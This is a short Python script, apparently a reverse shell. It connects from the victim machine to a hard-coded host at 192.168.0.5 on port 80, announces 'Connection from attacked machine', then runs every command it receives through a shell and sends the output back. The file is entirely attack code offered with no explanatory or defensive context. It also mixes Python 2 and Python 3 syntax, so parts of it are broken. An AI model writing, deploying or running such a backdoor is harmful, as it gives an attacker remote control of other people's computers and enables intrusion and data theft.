import socket, subprocess

HOST = '192.168.0.5'
PORT = 80

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))
sock.send(bytes("Connection from attacked machine", "UTF-8"))
while 1:
    data = sock.recv(1024)
    print data
    if data == 'exit':
        break
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()
    sock.send(stdout_value)
sock.close()
